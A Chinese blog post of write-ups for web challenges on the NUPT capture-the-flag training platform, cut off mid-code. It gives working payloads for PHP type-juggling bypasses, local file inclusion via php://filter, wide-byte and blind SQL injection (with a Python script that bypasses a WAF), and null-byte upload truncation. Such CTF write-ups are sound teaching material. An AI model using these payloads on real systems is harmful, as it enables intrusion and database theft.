---
layout: post
title: 南邮攻防训练平台Writeup
data: 2018-6-1
author: Qiqi
header-img: img/post-bg-coffee.jpeg
catalog: true
tag:
   - CTF
   - Writeup
---

# 南邮CTF WriteUp

## Web

### 签到题

**题干**

```
这一定是最简单的
```

**题解**

右键查看源代码，看到`nctf{flag_admiaanaaaaaaaaaaa}`

### md5 collision

**题干**

```php
源码

<?php
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
    echo "nctf{*****************}";
} else {
    echo "false!!!";
}}
else{echo "please input a";}
?>
```

**题解**

md5弱类型

我们只要找到md5加密后以`0e`开头的字符串就可以绕过`==`的判断了

```
QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a
```

类似的还有sha1

```
aaroZmOk aaK1STfY aaO8zKZF aaO8zKZF aa3OFF9m
```

得到flag:`nctf{md5_collision_is_easy}`

### 签到2

只要输入`zhimakaimen`即可，但是输入框对输入长度进行了限制

修改一下最大长度，输入`zhimakaimen`获得`flag is:nctf{follow_me_to_exploit}`

### 这题不是WEB

**题干**

```
真的，你要相信我！这题不是WEB
```

**题解**

这题确实不是web，这是一道图片隐写题

用16进制编辑器打开图片，在最后的地方发现`nctf{photo_can_also_hid3_msg}`

### 层层递进

打开是一个网站，右键查看一下源代码

发现一个`SO.html`，点进去

和刚刚那个网站长得很像，我们再次查看源代码

又看到了一个`S0.html`

联想到标题，这题可能是让我们一直找下去，找到头就能获得flag

接着后面一次发现`SO.htm`、 `S0.htm` 、`404.html`

最后我们看到

```
<!-- Placed at the end of the document so the pages load faster -->
<!--  
<script src="./js/jquery-n.7.2.min.js"></script>
<script src="./js/jquery-c.7.2.min.js"></script>
<script src="./js/jquery-t.7.2.min.js"></script>
<script src="./js/jquery-f.7.2.min.js"></script>
<script src="./js/jquery-{.7.2.min.js"></script>
<script src="./js/jquery-t.7.2.min.js"></script>
<script src="./js/jquery-h.7.2.min.js"></script>
<script src="./js/jquery-i.7.2.min.js"></script>
<script src="./js/jquery-s.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-i.7.2.min.js"></script>
<script src="./js/jquery-s.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-a.7.2.min.js"></script>
<script src="./js/jquery-_.7.2.min.js"></script>
<script src="./js/jquery-f.7.2.min.js"></script>
<script src="./js/jquery-l.7.2.min.js"></script>
<script src="./js/jquery-4.7.2.min.js"></script>
<script src="./js/jquery-g.7.2.min.js"></script>
<script src="./js/jquery-}.7.2.min.js"></script>
-->
```

拼接一下得到`nctf{this_is_a_fl4g}`

### AAencode

**题干**

```
javascript aaencode
```

**题解**

google一下`javascript aaencode`，发现是js的颜文字加密

注意这里打开可能是中文乱码，我们只要修改一下编码为unicode就可以正常显示了

```
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```

我们直接把这段颜文字放到控制台回车，会提示`ωﾟﾉ`undefined，所以我们要先定义一下`var ωﾟﾉ = " ";`，然后再执行那一段颜文字

这样我们可以在页面上看到弹框`nctf{javascript_aaencode}`

或者我们还可以`var ωﾟﾉ = " ";`，再把最后的`('_')`删掉

返回`nctf{javascript_aaencode}`

### 单身二十年

**题干**

```
这题可以靠技术也可以靠手速！
老夫单身二十年，自然靠的是手速！
```

**题解**

看到一个链接，查看源代码，该链接指向`./search_key.php`

点击链接，我们却去到了`./no_key_is_here_forever.php`这个页面

猜测是302跳转

burp抓包

获得`nctf{yougotit_script_now}`

### 你从哪里来

**题干**

```
你是从 google 来的吗？
```

**题解**

这题坏了，没办法做了，但是思路不会变

我们只要修改`referer: https://www.google.com`即可

flag也给大家`nctf{http_referer}`

### php decode

**题干**

```php
见到的一个类似编码的shell，请解码

<?php
function CLsI($ZzvSWE) {

    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));

    for ($i = 0; $i < strlen($ZzvSWE); $i++) {

        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);

    }

    return $ZzvSWE;

}eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));?>
```

**题解**

将代码复制到本地，将`eval`改成`echo`即可解密

运行一下得到`flag:nctf{gzip_base64_hhhhhh}`

### 文件包含

**题干**

```
没错 这就是传说中的LFI
```

**题解**

点击链接，看到了`file`参数可以包含文件

文件包含，可以使用php伪协议和filter过滤器，来读取源代码

payload

```
http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
```

返回

```
PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=
```

base64解码，得到

```php+HTML
<html>
    <title>asdf</title>
    
<?php
	error_reporting(0);
	if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
	$file=$_GET['file'];
	if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
		echo "Oh no!";
		exit();
	}
	include($file); 
//flag:nctf{edulcni_elif_lacol_si_siht}

?>
</html>
```

看到`flag:nctf{edulcni_elif_lacol_si_siht}`

### 单身一百年也没用

**题干**

```
是的。。这一题你单身一百年也没用
```

**题解**

和前面那个单身二十年思路一摸一样

抓包得到`flag: nctf{this_is_302_redirect}`

### COOKIE

**题干**

```
COOKIE就是甜饼的意思~
TIP:
0==not
```

**题解**

页面显示`please login first`

我们打开检查元素

看到请求头中`cookie: Login=0`

再根据题目中的tip，我们只要将0改为1即可

得到`flag:nctf{cookie_is_different_from_session}`

### MYSQL

**题干**

```
不能每一题都这么简单嘛
你说是不是？
```

**题解**

页面提示`Do you know robots.txt？`

于是访问`http://chinalover.sinaapp.com/web11/robots.txt`

返回

```php
别太开心，flag不在这，这个文件的用途你看完了？
在CTF比赛中，这个文件往往存放着提示信息

TIP:sql.php

<?php
if($_GET[id]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}
?>
```

根据CTF的套路，应该是让我们输入一个`id`，但他的值不等于`1024`，但是`intval`之后和`1024`相等

那么只要知道`intval`取整，就很容易了

payload

`http://chinalover.sinaapp.com/web11/sql.php?id=1024.1`

返回`the flag is:nctf{query_in_mysql}`

### sql injection 3

搜索一下`SQL-GBK`发现是宽字节注入

当我们使用`'`闭合的时候，发现会被`\`转义，没有办法成功闭合它

这里我们就要使用宽字节注入来进行绕过，mysql在使用GBK编码的时候，会认为两个字符是一个汉字，当我们输入`%df`的时候，出现如下报错：

```
your sql:select id,title from news where id = '1運''

Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10
```

发现出现了报错，说明我们的语句已经影响了正常语句的执行了，可以注入了。这里为什么加一个`%df`就可以了呢？因为这是mysql的一种特性，GBK是多字节编码，它认为两个字节就代表一个汉字，在`%df`加入的时候会和转义符`\`，即`%5c`进行结合，变成了一个`“運”`，而’逃逸了出来

因此只要第一个字节和`%5c`结合是一个汉字，就可以成功绕过了，当第一个字节的**ascii码大于128**，就可以了

**order by**

我们先使用`order by`语句，发现只有两列

**查询库名**

```
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df' union select 1,database()--+
```

得到`sae-chinalover`

**查询表名**

```
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
```

得到`ctf,ctf2,ctf3,ctf4,news`

**查询列名**

查询`ctf4`表

```
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x63746634--+
```

得到`flag`

**查询数据**

```
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df' union select 1,flag from ctf4--+
```

得到`nctf{gbk_3sqli}`

### /x00

**题干**

```
题目有多种解法，你能想出来几种？
```

**题解**

```php
if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }
```

**第一种方法**

第一个不等式中`ereg`函数，当传入参数为数组`nctf[]`时，`NULL != FALSE` ，构造成功跳过第一个不等式
第二个不等式中`strpos`函数传入参数数组之后 `NULL != FLASE`会返回flag

所以payload`?nctf[]=`

**第二种方法**

使用`00截断`绕过`ereg`函数，但要注意将`#`url编码

payload：`?nctf=1%00%23biubiubiu`

### bypass again

**题干**

```
依旧是弱类型
```

**题解**

```php
if (isset($_GET['a']) and isset($_GET['b'])) {
if ($_GET['a'] != $_GET['b'])
if (md5($_GET['a']) == md5($_GET['b']))
die('Flag: '.$flag);
else
print 'Wrong.';
}
```

只需要找到两个字符串经过`md5`加密后，均以`0e`开头即可绕过验证

Payload：`?a=QNKCDZO&b=240610708`

得到`Flag: nctf{php_is_so_cool}`

### 变量覆盖

**题干**

```
听说过变量覆盖么？
```

**题解**

关键代码

```php
<?php if ($_SERVER["REQUEST_METHOD"] == "POST") {
    extract($_POST);
    if ($pass == $thepassword_123) {
        echo $theflag;
   } 
}
?>
```

post`pass=1&thepassword_123=1`

得到`nctf{bian_liang_fu_gai!}`

### PHP是世界上最好的语言

**题干**

```
听说PHP是世界上最好的语言
```

**题解**

```php
<?php
if(eregi("hackerDJ",$_GET[id])) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
  echo "<p>Access granted!</p>";
  echo "<p>flag: *****************} </p>";
}
?>
```

将`hackerDJ`经过两次url编码

payload：`?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61`

得到`nctf{php_is_best_language}`

### Header

**题干**

````
头啊！！头啊！！！
````

**题解**

直接看报头，有个`Flag: nctf{tips_often_hide_here}`

### 上传绕过

**题干**

```
猜猜代码怎么写的
```

**题解**

尝试上传`.php`文件，返回`只允许上传 jpg，GIF ，png后缀的文件`

上传`.jpg`文件，返回`必须是php文件才行啊！`

看一下请求

```
/uploads/
-----------------------------66246405014780623021849764865
Content-Disposition: form-data; name="file"; filename="test.jpg
Content-Type: text/php
```

返回

```
Array
(
    [0] => .jpg
    [1] => jpg
)
Upload: test.jpg<br />Type: text/php<br />Size: 0.025390625 Kb<br />Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) {
  ["dirname"]=>
  string(9) "./uploads"
  ["basename"]=>
  string(4) ".php"
  ["extension"]=>
  string(3) "php"
  ["filename"]=>
  string(0) ""
}
```

尝试在`/uploads/`后面加上`test.php+空格 `，`filename="test.jpg"`

然后将打开HEX，将`test.php`后面空格`20`改为`00`，构造`00`截断

上传，返回`恭喜你获得flag一枚：flag:nctf{welcome_to_hacks_world}`

### SQL注入1

**题干**

```
听说你也会注入？
```

**题解**

关键代码

```php
<?php
if($_POST[user] && $_POST[pass]) {
    mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = trim($_POST[user]);
  $pass = md5(trim($_POST[pass]));
  $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')";
    echo '</br>'.$sql;
  $query = mysql_fetch_array(mysql_query($sql));
  if($query[user]=="admin") {
      echo "<p>Logged in! flag:******************** </p>";
  }
  if($query[user] != "admin") {
    echo("<p>You are not admin!</p>");
  }
}
echo $query[user];
?>
```

Payload：`user=admin')#&pass=1`

成功绕过验证`flag:nctf{ni_ye_hui_sql?}`

### pass check

**题干**

核心源码

```php
<?php
$pass=@$_POST['pass'];
$pass1=***********;//被隐藏起来的密码
if(isset($pass))
{
if(@!strcmp($pass,$pass1)){
echo "flag:nctf{*}";
}else{
echo "the pass is wrong!";
}
}else{
echo "please input pass!";
}
?>
```

**题解**

我们要知道`strcmp(array,string)==null==0`，这道题就迎刃而解了

Payload：`pass[]=`

返回得到`flag:nctf{strcmp_is_n0t_3afe}`

### 起名字真难

**题干**

代码如下：

```php
<?php
 function noother_says_correct($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {   
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '54975581388';
}
$flag='*******';
if(noother_says_correct($_GET['key']))
    echo $flag;
else 
    echo 'access denied';
?>
```

**题解**

不能出现`1-9`之间的数字，那么我们只能尝试将`54975581388`转成16进制

转换后的结果是`ccccccccc`，可以使用

payload：`?key=0xccccccccc`

得到`The flag is:nctf{follow_your_dream}`

### 密码重置

**题干**

```
重置管理员账号：admin 的密码

你在点击忘记密码之后 你的邮箱收到了这么一封重置密码的邮件：

点击此链接重置您的密码
```

**题解**

进去以后，我们发现账号那一栏被钉死为`ctfuser`，同时还有这样一个get参数`user1=%59%33%52%6D%64%58%4E%6C%63%67%3D%3D`

先`urldecode`再`base64decode`得到`ctfuser`

这样一来，这题就很简单了

我们抓个包将这两个地方修改一下即可

payload：

`user=admin&newpass=1&vcode=1234`

`?user1=%59%57%52%74%61%57%34%3d`

得到`flag is:nctf{reset_password_often_have_vuln}`

### sql injection 4

**题干**

```
继续注入吧~
TIP:反斜杠可以用来转义
仔细查看相关函数的用法
```

**题解**

源代码

```php
<!--
#GOAL: login as admin,then get the flag;
error_reporting(0);
require 'db.inc.php';

function clean($str){
	if(get_magic_quotes_gpc()){
		$str=stripslashes($str);
	}
	return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
	die('Invalid password!');
}

echo $flag;
-->
Invalid password!
```

这题的`clean`函数用来过滤引号，会将其转化为实体编码，所以我们没有办法直接用引号来闭合了，只能运用转义字符来吃掉后面的那个单引号了

我们传一个转义字符`\`进去，即`username=\`，就可以将后面的那个单引号变成被我们传入的反斜杠转义的单引号，从而使它失去闭合能力（被转义的单引号不能参与闭合）

如此一来我们就逃出来了，并且`username='\' AND pass='`

接下来我们只要使用万能密码绕过即可`or 1=1`

最后别忘了加上注释

payload：`username=\&password=or 1=1—+`

如果使用`#`注释，别忘了使用`urlencode`

`flag:nctf{sql_injection_is_interesting}`

### 综合题

**题干**

```
tip:bash
```

**题解**

打开网页是一段`jsfuck`

放到控制台运行一下，得到`1bc29b36f623ba82aaf6724fd3b16718.php`

访问该页面，提示说`tip在我的脑子里面`，应该是报头里面有提示，果然，有个`tip: history of bash`

我们知道bash的历史记录都被存放在了`.bash_histroy`这个隐藏文件里

所以我们去访问这个文件，得到`zip -r flagbak.zip ./*`

再去访问`flagbak.zip`，将其下载下来，打开里面有个`flag.txt`，里面就是`flag is:nctf{bash_history_means_what}`

### SQL注入2

**题干**

```
注入第二题~~主要考察union查询
```

**题解**

关键代码

```php
<?php
if($_POST[user] && $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'"));
  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
      echo "<p>Logged in! Key: ntcf{**************} </p>";
  }
  else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```

我们知道当时用`union select`的时候，会返回`union select`后面的值，也就是说`$query`的值是我们可控的，我们只要让`$query`中存在`md5($pass)`就可以了

构造payload：`user=' union select md5(1)#&pass=1`

获得flag：`Logged in! Key: ntcf{union_select_is_wtf} `

### 综合题2

**题干**

```
非xss题 但是欢迎留言~
```

**题解**

有个留言框，可以发表留言

提交后有个弹框`昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)`

那我们就去查看源代码

发现一个`./so.php`提示`万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~`

如果要想访问这个页面的话，应该需要知道`UA`的判断，但这个我们暂时不知道，先放一边

还有一个`./about.php?file=sm.txt`，发现是个文件包含，可以用`php://filter`伪协议来读取源码

我们就来读一下，目前我们所能掌握到的，这里我就列举一下有用的

**so.php**

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>搜索留言</title>
</head>

<body>
<center>
<div id="say" name="say" align="left" style="width:1024px">
<?php
if($_SERVER['HTTP_USER_AGENT']!="Xlcteam Browser"){
echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~';
    exit();
}
$id=$_POST['soid'];
include 'config.php';
include 'antiinject.php';
include 'antixss.php';
$id=antiinject($id);
$con = mysql_connect($db_address,$db_user,$db_pass) or die("不能连接到数据库！！".mysql_error());
mysql_select_db($db_name,$con);
$id=mysql_real_escape_string($id);
$result=mysql_query("SELECT * FROM `message` WHERE display=1 AND id=$id");
$rs=mysql_fetch_array($result);
echo htmlspecialchars($rs['nice']).':<br />&nbsp;&nbsp;&nbsp;&nbsp;'.antixss($rs['say']).'<br />';
mysql_free_result($result);
mysql_free_result($file);
mysql_close($con);
?>
</div>
</center>
</body>
</html>
```

我们看到这句`$_SERVER['HTTP_USER_AGENT']!="Xlcteam Browser"`，掌握了`UA`信息，在请求头中加上`User-Agent=Xlcteam Browser`就可成功去访问了

同时，很惊喜的我们发现了可以注入的点，看这句`$result=mysql_query("SELECT * FROM message WHERE display=1 AND id=$id");`

`$id`是由我们传入的`$_POST['soid']`控制的，完全可控，可以注入

上面我们还能看到一个`antiinject.php`，应该是个waf

**antiinject.php**

```php
<?php
function antiinject($content){
$keyword=array("select","union","and","from",' ',"'",";",'"',"char","or","count","master","name","pass","admin","+","-","order","=");
$info=strtolower($content);
for($i=0;$i<=count($keyword);$i++){
 $info=str_replace($keyword[$i], '',$info);
}
return $info;
}
?>
```

果不其然，确实是个waf，我们传入的`soid`参数也会受到它的检验，不过我们可以通过双写轻易绕过

这样一来我们就可以尝试注入了

尝试payload

`soid=1^(ascii(mid((database())frofromm(1)))>32)`

发现当后面为真时，页面什么又没有，当后面为假时，页面返回

```
大秘密:
    交个朋友吧，这个是我微信号 e045e454c18ca8a4415cfeddd1f7375eb0595c71ac00a0e4758761e1cc83f2c565bb09bfd94d1f6c2ffc0fb9849203a14af723b532cbf44a2d6f41b0dee4e834 这是原来管理员说的话，一不小心给覆盖了，sorry！！！欢迎来到xlcteam渗透挑战平台，在这里各位黑阔可以尽情施展你们那牛X的技术和猥琐流的渗透技巧。 （别说SAE没有写权限传不了shell，渗透到后台之后就什么都知道了）。 对了，各位脚本小子就不要拿各种扫描工具猛扫了，也扫不到什么东西的。当然，适当的收集资料还是可以的
```

这样我们可以盲注了

**库名**

payload如上

**表名**

`soid=1^(ascii(mid((selselectect/**/group_concat(table_nanameme)/**/frofromm/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database())frofromm(1)))>32)`

后面不再一一列举，和上面类似，注意一下过滤的字符就好，这里过滤了`=`，我们可以使用`like`语句，`'`'和`"`被过滤，可以将表名转为16进制

这里也给出脚本的一个样例

```php
import requests
url = 'http://cms.nuptzj.cn/so.php'
s = requests.Session()
passwd = ''
headers = {'User-Agent': 'Xlcteam Browser'}
for l in range(1,33):
    for c in range(32,133):
        soid = "1^(ascii(mid((selselectect/**/group_concat(column_nanameme)/**/frofromm/**/infoorrmation_schema.columns/**/where/**/table_schema/**/like/**/database()/**/anandd/**/table_nanameme/**/like/**/0x6861636b65726970)frofromm(%d)))>%d)" % (l,c)
        data = {'soid':soid}
        html = s.post(url,data=data,headers=headers).text
        if 'sorry' in html:
            passwd += chr(c)
            print passwd
            break
```

不要忘记加上`UA`

我把所有我注出来的信息全部整理了一下，如下

```
库名：sae-exploitblog

表名：admin,filename,hackerip,message

message表：id,nice,say,display
	nice字段：,admin,wtf,1111,1111,1,1,1,2,
    
admin表：id,username,userpass
	username字段：admin
    userpass字段：102 117 99 107 114 117 110 116 117 -> fuckruntu

filename表：id,name,path
	name字段：conpass.php,arlogined.php
    path字段：./conpass.php,./arlogined.php
    
hackerip表：id,qq,mail,ip
```

这个注入很想吐槽了，弄这么多表还有列～累死我了

至此，我们获得了`admin`的密码`fuckruntu`，并且看到了登录框的一点影子`./conpass.php,./arlogined.php`

看着时当前目录，天真的以为就网站根目录，结果访问是`404`，于是又卡住了，左思右想，突然想起还有个`about.php`没有读，就是文件包含那个页面，忘记读它自己的代码了

**about.php**

```php
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
$file=$_GET['file'];
if($file=="" || strstr($file,'config.php')){
echo "file参数不能为空！";
exit();
}else{
